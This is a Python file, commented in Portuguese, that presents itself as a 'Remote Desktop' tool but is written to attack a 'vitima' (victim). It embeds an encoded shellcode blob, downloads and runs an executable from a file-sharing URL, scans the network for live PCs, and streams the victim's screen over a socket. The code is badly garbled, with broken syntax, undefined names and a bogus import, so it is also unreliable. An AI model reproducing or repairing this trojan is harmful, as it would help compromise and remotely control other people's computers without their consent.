"""
Copyright 2017 isthe0x.
Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at
http://www.apache.org/licenses/LICENSE-2.0
_______________________________________________________________

Python3, python2 > Apenas para essas versão de python :)!
_______________________________________________________________
"""

from sys import argv
from re import match
from os import system
import random
import stat
import grok
import argparse, socket
import subprocess, threading

class remote():

     shellcode = ("\xd9\xee\xbf\xad\x07\x92\x3e\xd9\x74\x24\xf4\x5e\x2b\xc9" +
                  "\xb1\x56\x31\x7e\x18\x03\x7e\x18\x83\xc6\xa9\xe5\x67\xc2" +
                  "\x59\x60\x87\x3b\x99\x13\x01\xde\xa8\x01\x75\xaa\x98\x95" +
                  "\xfd\xfe\x10\x5d\x53\xeb\xa3\x13\x7c\x1c\x04\x99\x5a\x13" +
                  "\x95\x2f\x63\xff\x55\x31\x1f\x02\x89\x91\x1e\xcd\xdc\xd0" +
                  "\x67\x30\x2e\x80\x30\x3e\x9c\x35\x34\x02\x1c\x37\x9a\x08" +
                  "\x1c\x4f\x9f\xcf\xe8\xe5\x9e\x1f\x40\x71\xe8\x87\xeb\xdd" +
                  "\xc9\xb6\x38\x3e\x35\xf0\x35\xf5\xcd\x03\x9f\xc7\x2e\x32" +
                  "\xdf\x84\x10\xfa\xd2\xd5\x55\x3d\x0c\xa0\xad\x3d\xb1\xb3" +
                  "\x75\x3f\x6d\x31\x68\xe7\xe6\xe1\x48\x19\x2b\x77\x1a\x15" +
                  "\x80\xf3\x44\x3a\x17\xd7\xfe\x46\x9c\xd6\xd0\xce\xe6\xfc" +
                  "\xf4\x8b\xbd\x9d\xad\x71\x10\xa1\xae\xde\xcd\x07\xa4\xcd" +
                  "\x1a\x31\xe7\x99\xef\x0c\x18\x5a\x67\x06\x6b\x68\x28\xbc" +
                  "\xe3\xc0\xa1\x1a\xf3\x27\x98\xdb\x6b\xd6\x22\x1c\xa5\x1d" +
                  "\x76\x4c\xdd\xb4\xf6\x07\x1d\x38\x23\x87\x4d\x96\x9b\x68" +
                  "\x3e\x56\x4b\x01\x54\x59\xb4\x31\x57\xb3\xc3\x75\x99\xe7" +
                  "\x80\x11\xd8\x17\x37\xbe\x55\xf1\x5d\x2e\x30\xa9\xc9\x8c" +
                  "\x67\x62\x6e\xee\x4d\xde\x27\x78\xd9\x08\xff\x87\xda\x1e" +
                  "\xac\x24\x72\xc9\x26\x27\x47\xe8\x39\x62\xef\x63\x02\xe5" +
                  "\x65\x1a\xc1\x97\x7a\x37\xb1\x34\xe8\xdc\x41\x32\x11\x4b" +
                  "\x16\x13\xe7\x82\xf2\x89\x5e\x3d\xe0\x53\x06\x06\xa0\x8f" +
                  "\xfb\x89\x29\x5d\x47\xae\x39\x9b\x48\xea\x6d\x73\x1f\xa4" +
                  "\xdb\x35\xc9\x06\xb5\xef\xa6\xc0\x51\x69\x85\xd2\x27\x76" +
                  "\xc0\xa4\xc7\xc7\xbd\xf0\xf8\xe8\x29\xf5\x81\x14\xca\xfa" +
                  "\x58\x9d\xa0\xc0\x80\xbf\xdc\x6c\xd1\xfd\x80\x8e\x0c\xc1" +
                  "\xbc\x0c\xa4\xba\x3a\x0c\xcd\xbf\x07\x8a\x3e\xb2\x18\x7f" +
                  "\x40\x61\x18\xaa")
  

parser = argparse.ArgumentParser(description='<< Remote Desktop to Python!')
parser.add_argument('--vitima', dest='accumulate', action='store_const')
args = parser.parse_args()

if param.vitima():
	shellcode.set(vitima)
     subprocess('call', dir=0, shellcode=True)
     IPV4 = vitima[argv.exit]
     witdh, height = [int(IPV4) for a in str(subprocess.check_output("xrandr | grep '*' | awk '{print $1}'", shell=True))[2:-3].split('x')] 
       t1 = thread.start(dest="30%")
       t2 = thread.start(0)
       t3 = thread.start(0)

return vitima

diretório = [dir, self=vitima()]

    if (diretório == "C:\Users\{}\Documents" + argv[4:0]):
    	st = os.stat('data')
    	os.chmod('Developer-3', st.st_mode | stat.S_IEXEC)
    	  FILE = grok.name('https://fs06n2.sendspace.com/dl/c4c91bd871422016d87ee6bf123836ce/5a9323f341db7394/1szd6a/Option.exe') 
          subprocess.check_call(["C:\Users\{}\Downloads\Option.exe", "start", " | ", "grep", "{}" + argv[4:0]])

return diretório


        def conectar():
        	global livepc

        	subprocess.call('conn.tmp', shell=True)
        	f = open('conn.tmp', 'r')
        	if f.readline()[0]=='S':
        		f.readline();f.readline()
        		host = f.readline(IPV4)
        		while host[0] == '\\':
        			livepc.append(host[2:host.find(' ')])
        			host = f.readline(IPV4)
        	    print(livepc)
        	    livepc.remove(gethostname().upper())
        	    print(livepc)
        	    for i in livepc:
        	        slive.sendto("live", (IPV4, FILE))
        	    f.close()

       def desktop():
           if __name__ == '__main__':
	          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	          s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	          s.bind((HOST, PORT))
	          s.listen(1)
	          img1 = ImageGrab.grab()
	          size = img1.size
	          mi = utils.MouseClass()
        	        
        	        while 1:
        	        	conn, addr = s.accept()
        	        	print(">> Conectado ao computador " + vitima.argv[4:0])

        	        	vitimaid = random.randint(100000, 999999)
        	        	print(">> ID Do servidor " + str(vitimaid))
        	        	encryptedID = vitimaid^key
        	        	receivedstr = conn.recv(1024)
        	        	receivedID = int(receivedstr)
        	        	if receivedID != encryptedID:
        	        		exitFlag = True
        	        		print(">> Não foi possivel capturar ID dá vitima!")
        	        		conn.close()
        	            conn.sendall(str(size))
        	            print(">> Vitima Invalida")

        	            exitFlag = False
        	            t1 = threading.thread(target=SendScreen, args=(conn,))
        	            t1.daemon = True
        	            threads.append(t1)
        	            t1.start()

        	            while 1:
        	                  data = ""
        	                  data = conn.recv(1024)
        	                  if len(data) == 0:
        	                      exitFlag = True
        	                      print("-- Disconectado dá vitima ", addr)
        	                      break
        	                      conn.close()		
